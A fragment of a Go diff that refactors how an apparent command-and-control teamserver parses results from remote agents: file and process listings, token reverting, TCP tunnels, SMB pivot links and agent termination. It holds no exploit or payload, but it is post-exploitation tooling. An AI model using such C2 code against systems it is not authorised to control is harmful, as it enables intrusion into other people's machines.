+				task.Message = fmt.Sprintf("----- New SMB pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
+				ts.TsAgentConsoleOutput(childAgentId, MESSAGE_SUCCESS, task.Message, "\n", true)
+			}
 
 		case COMMAND_LS:
 			if false == packer.CheckPacker([]string{"byte"}) {
-				return
+				return outTasks
 			}
 			result := packer.ParseInt8()
 
@@ -1193,7 +1288,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 			if result == 0 {
 				if false == packer.CheckPacker([]string{"int"}) {
-					return
+					return outTasks
 				}
 				errorCode := packer.ParseInt32()
 				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
@@ -1201,9 +1296,9 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 			} else {
 				if false == packer.CheckPacker([]string{"array", "int"}) {
-					return
+					return outTasks
 				}
-				rootPath = ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
+				rootPath = ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
 				rootPath, _ = strings.CutSuffix(rootPath, "\\*")
 
 				filesCount := int(packer.ParseInt32())
@@ -1217,14 +1312,14 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 					for i := 0; i < filesCount; i++ {
 						if false == packer.CheckPacker([]string{"byte", "long", "int", "array"}) {
-							return
+							return outTasks
 						}
 						isDir := packer.ParseInt8()
 						fileData := ListingFileData{
 							IsDir:    false,
-							Size:     packer.ParseInt64(),
-							Date:     uint64(packer.ParseInt32()),
-							Filename: ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP),
+							Size:     int64(packer.ParseInt64()),
+							Date:     int64(packer.ParseInt32()),
+							Filename: ConvertCpToUTF8(packer.ParseString(), agentData.ACP),
 						}
 						if isDir > 0 {
 							fileData.IsDir = true
@@ -1240,7 +1335,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 					OutputText += fmt.Sprintf(" %-8s %-14s %-20s  %s", "----", "---------", "----------------   ", "----")
 
 					for _, item := range items {
-						t := time.Unix(int64(item.Date), 0).UTC()
+						t := time.Unix(item.Date, 0).UTC()
 						lastWrite := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())
 
 						if item.IsDir {
@@ -1256,29 +1351,37 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 			SyncBrowserFiles(ts, task, rootPath, items)
 
-			break
-
 		case COMMAND_MKDIR:
 			if false == packer.CheckPacker([]string{"array"}) {
-				return
+				return outTasks
 			}
-			path := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
+			path := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
 			task.Message = fmt.Sprintf("Directory '%v' created successfully", path)
-			break
 
 		case COMMAND_MV:
 			task.Message = "File moved successfully"
-			break
+
+		case COMMAND_PIVOT_EXEC:
+			if false == packer.CheckPacker([]string{"int", "array"}) {
+				return outTasks
+			}
+
+			pivotId := fmt.Sprintf("%08x", packer.ParseInt32())
+			pivotData := packer.ParseBytes()
+
+			_, _, childAgentId := ts.TsGetPivotInfoById(pivotId)
+
+			_ = ts.TsAgentProcessData(childAgentId, pivotData)
 
 		case COMMAND_PROFILE:
 			if false == packer.CheckPacker([]string{"int"}) {
-				return
+				return outTasks
 			}
 			subcommand := packer.ParseInt32()
 
 			if subcommand == 1 {
 				if false == packer.CheckPacker([]string{"int", "int"}) {
-					return
+					return outTasks
 				}
 				sleep := packer.ParseInt32()
 				jitter := packer.ParseInt32()
@@ -1289,22 +1392,21 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 				task.Message = "Sleep time has been changed"
 
 				var buffer bytes.Buffer
-				json.NewEncoder(&buffer).Encode(agentData)
+				_ = json.NewEncoder(&buffer).Encode(agentData)
 
-				ts.TsAgentUpdateData(buffer.Bytes())
+				_ = ts.TsAgentUpdateData(buffer.Bytes())
 
 			} else if subcommand == 2 {
 				if false == packer.CheckPacker([]string{"int"}) {
-					return
+					return outTasks
 				}
 				size := packer.ParseInt32()
 				task.Message = fmt.Sprintf("Download chunk size set to %v bytes", size)
 			}
-			break
 
 		case COMMAND_PS_LIST:
 			if false == packer.CheckPacker([]string{"byte", "int"}) {
-				return
+				return outTasks
 			}
 
 			result := packer.ParseInt8()
@@ -1329,7 +1431,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 				for i := 0; i < processCount; i++ {
 					if false == packer.CheckPacker([]string{"word", "word", "word", "byte", "byte", "array", "array", "array"}) {
-						return
+						return outTasks
 					}
 					procData := ListingProcessData{
 						Pid:       uint(packer.ParseInt16()),
@@ -1346,8 +1448,8 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 					}
 
 					elevated := packer.ParseInt8()
-					domain := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
-					username := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
+					domain := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
+					username := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
 
 					if username != "" {
 						procData.Context = username
@@ -1363,7 +1465,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 						}
 					}
 
-					procData.ProcessName = ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
+					procData.ProcessName = ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
 
 					proclist = append(proclist, procData)
 				}
@@ -1381,23 +1483,20 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 			SyncBrowserProcess(ts, task, proclist)
 
-			break
-
 		case COMMAND_PS_KILL:
 			if false == packer.CheckPacker([]string{"int"}) {
-				return
+				return outTasks
 			}
 			pid := packer.ParseInt32()
 			task.Message = fmt.Sprintf("Process %d killed", pid)
-			break
 
 		case COMMAND_PS_RUN:
 			if false == packer.CheckPacker([]string{"int", "byte", "array"}) {
-				return
+				return outTasks
 			}
 			pid := packer.ParseInt32()
 			isOutput := packer.ParseInt8()
-			prog := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
+			prog := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
 
 			status := "no output"
 			if isOutput > 0 {
@@ -1406,20 +1505,29 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 			task.Completed = false
 			task.Message = fmt.Sprintf("Program %v started with PID %d (output - %v)", prog, pid, status)
-			break
 
 		case COMMAND_PWD:
 			if false == packer.CheckPacker([]string{"array"}) {
-				return
+				return outTasks
 			}
-			path := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
+			path := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
 			task.Message = "Current working directory:"
 			task.ClearText = path
-			break
+
+		case COMMAND_REV2SELF:
+			if false == packer.CheckPacker([]string{"byte"}) {
+				return outTasks
+			}
+
+			gui := packer.ParseInt8()
+			if gui == 1 {
+				task.Message = "Token reverted successfully"
+			}
+			_ = ts.TsAgentImpersonate(agentData.Id, "", agentData.Elevated)
 
 		case COMMAND_RM:
 			if false == packer.CheckPacker([]string{"byte"}) {
-				return
+				return outTasks
 			}
 			result := packer.ParseInt8()
 			if result == 0 {
@@ -1427,11 +1535,10 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 			} else {
 				task.Message = "Directory deleted successfully"
 			}
-			break
 
 		case COMMAND_TUNNEL_START_TCP:
 			if false == packer.CheckPacker([]string{"byte"}) {
-				return
+				return outTasks
 			}
 
 			channelId := int(TaskId)
@@ -1444,7 +1551,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 		case COMMAND_TUNNEL_WRITE_TCP:
 			if false == packer.CheckPacker([]string{"array"}) {
-				return
+				return outTasks
 			}
 
 			channelId := int(TaskId)
@@ -1453,27 +1560,26 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 		case COMMAND_TUNNEL_REVERSE:
 			if false == packer.CheckPacker([]string{"byte"}) {
-				return
+				return outTasks
 			}
 			var err error
 			tunnelId := int(TaskId)
 			result := packer.ParseInt8()
 			if result == 0 {
-				task.Message, err = ts.TsTunnelStateRemotePortFwd(tunnelId, false)
+				task.TaskId, task.Message, err = ts.TsTunnelStateRemotePortFwd(tunnelId, false)
 			} else {
-				task.Message, err = ts.TsTunnelStateRemotePortFwd(tunnelId, true)
+				task.TaskId, task.Message, err = ts.TsTunnelStateRemotePortFwd(tunnelId, true)
 			}
 
 			if err != nil {
 				task.MessageType = MESSAGE_ERROR
 			} else {
 				task.MessageType = MESSAGE_SUCCESS
-				ts.TsAgentConsoleOutput(agentData.Id, int(MESSAGE_SUCCESS), task.Message, "")
 			}
 
 		case COMMAND_TUNNEL_ACCEPT:
 			if false == packer.CheckPacker([]string{"int"}) {
-				return
+				return outTasks
 			}
 			tunnelId := int(TaskId)
 			channelId := int(packer.ParseInt32())
@@ -1481,7 +1587,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 		case COMMAND_TERMINATE:
 			if false == packer.CheckPacker([]string{"int"}) {
-				return
+				return outTasks
 			}
 			exitMethod := packer.ParseInt32()
 			if exitMethod == 1 {
@@ -1489,16 +1595,46 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 			} else if exitMethod == 2 {
 				task.Message = "The agent has completed its work (kill process)"
 			}
-			break
+
+			_ = ts.TsAgentTerminate(agentData.Id, task.TaskId)
+
+		case COMMAND_UNLINK:
+			if false == packer.CheckPacker([]string{"int", "byte"}) {
+				return outTasks
+			}
+
+			pivotId := fmt.Sprintf("%08x", packer.ParseInt32())
+			pivotType := packer.ParseInt8()
+
+			messageParent := ""
+			messageChild := ""
+			_, parentAgentId, childAgentId := ts.TsGetPivotInfoById(pivotId)
+
+			if pivotType == 1 {
+				messageParent = fmt.Sprintf("SMB agent disconnected %s", childAgentId)
+				messageChild = fmt.Sprintf(" ----- SMB agent disconnected from [%s] ----- ", parentAgentId)
+			} else if pivotType == 10 {
+				messageParent = fmt.Sprintf("Pivot agent %s connection reset", childAgentId)
+				messageChild = fmt.Sprintf(" ----- Pivot agent connection reset ----- ")
+			}
+
+			if pivotType != 0 {
+				_ = ts.TsPivotDelete(pivotId)
+				if TaskId == 0 {
+					ts.TsAgentConsoleOutput(parentAgentId, MESSAGE_SUCCESS, messageParent, "\n", true)
+				} else {
+					task.Message = messageParent
+				}
+				ts.TsAgentConsoleOutput(childAgentId, MESSAGE_SUCCESS, messageChild, "\n", true)
+			}
 
 		case COMMAND_UPLOAD:
 			task.Message = "File successfully uploaded"
 			SyncBrowserFilesStatus(ts, task)
-			break
 
 		case COMMAND_ERROR:
 			if false == packer.CheckPacker([]string{"int"}) {
-				return
+				return outTasks
 			}
 			errorCode := packer.ParseInt32()
 			task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
@@ -1508,9 +1644,9 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 			continue
 		}
 
-		_ = json.NewEncoder(&taskObject).Encode(task)
-		ts.TsTaskUpdate(agentData.Id, taskObject.Bytes())
+		outTasks = append(outTasks, task)
 	}
+	return outTasks
 }
 
 /// BROWSERS
